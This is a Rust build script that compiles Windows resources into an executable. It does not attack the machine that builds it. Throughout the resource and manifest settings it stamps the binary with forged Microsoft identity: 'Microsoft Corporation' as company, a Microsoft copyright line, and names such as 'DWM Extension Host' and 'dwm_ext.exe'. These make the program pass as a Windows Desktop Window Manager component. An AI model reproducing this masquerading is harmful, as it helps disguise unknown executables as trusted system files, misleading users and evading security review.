use std::env;
use std::process::Command;

fn main() {
    #[cfg(all(target_os = "windows"))]
    {
        println!("cargo:rerun-if-changed=Cargo.toml");
        println!("cargo:rerun-if-changed=apple.ico");
        println!("cargo:rerun-if-changed=build.rs");
        let mut res = winres::WindowsResource::new();
        res.set_manifest(
            r#"
            <assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0" xmlns:asmv3="urn:schemas-microsoft-com:asm.v3">
                <assemblyIdentity version="1.0.0.0" name="System.Component.DWM.Helper"/>
                <dependency>
                    <dependentAssembly>
                        <assemblyIdentity
                            type="win32"
                            name="Microsoft.Windows.Common-Controls"
                            version="6.0.0.0"
                            processorArchitecture="*"
                            publicKeyToken="6595b64144ccf1df"
                            language="*"
                        />
                    </dependentAssembly>
                </dependency>
                <asmv3:application>
                    <asmv3:windowsSettings>
                        <dpiAware xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">true/pm</dpiAware>
                        <dpiAwareness xmlns="http://schemas.microsoft.com/SMI/2016/WindowsSettings">PerMonitorV2</dpiAwareness>
                    </asmv3:windowsSettings>
                </asmv3:application>
                <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
                    <security>
                        <requestedPrivileges>
                            <requestedExecutionLevel level="asInvoker" uiAccess="false" />
                        </requestedPrivileges>
                    </security>
                </trustInfo>
            </assembly>
            "#,
        );

        let build_hash = get_commit_hash();
        res.set_icon("apple.ico");
        res.set("ProductName", "Windows Desktop Composition Component");
        res.set("FileDescription", "DWM Extension Host");
        res.set("CompanyName", "Microsoft Corporation");
        res.set("LegalCopyright", "© Microsoft Corporation. All rights reserved.");
        res.set("InternalName", &format!("dwm_ext_{}", build_hash));
        res.set("OriginalFilename", "dwm_ext.exe");
        if let Err(e) = res.compile() {
            eprintln!("Failed to compile Windows resources: {}", e);
            std::process::exit(1);
        }
    }
}

fn get_commit_hash() -> String {
    Command::new("git")
        .args(["rev-parse", "--short", "HEAD"])
        .output()
        .ok()
        .and_then(|output| String::from_utf8(output.stdout).ok())
        .map(|s| s.trim().to_string())
        .unwrap_or_else(|| "release".to_string())
}
